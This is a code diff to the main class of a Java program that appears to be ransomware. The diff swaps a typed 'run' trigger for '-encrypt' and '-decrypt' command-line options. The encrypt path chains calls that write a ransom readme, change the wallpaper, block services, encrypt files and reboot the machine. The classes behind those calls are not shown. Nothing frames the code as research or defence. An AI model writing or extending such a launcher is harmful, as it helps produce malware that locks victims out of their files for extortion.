@@ -1,26 +1,23 @@
 package kr.pah;
 
-import java.util.Scanner;
-
 public class Main {
     public static void main(String[] args) throws Exception {
-        Scanner sc = new Scanner(System.in);
-        String verify = sc.nextLine();
-        if (verify.equals("run")) {
-            System.out.println("CreateReadme");
+        if (args.length != 1) {
+            return;
+        }
+
+        String option = args[0];
+
+        if (option.equals("-encrypt")) {
             CreateReadme.main();
-            System.out.println("Change Wallpaper");
             WallpaperChanger.main();
-            System.out.println("Service Block");
             ServiceBlock.blockAll();
-            System.out.println("Encrypting...");
             Encrypt.runEncryption();
-            System.out.println("Done");
             SystemReboot.main();
-        } else if (verify.equals("decrypt")) {
+        } else if (option.equals("-decrypt")) {
             Decrypt.runDecryption();
         } else {
-            System.out.println("NotRun");
+            System.out.println("Invalid option: " + option);
         }
     }
 }
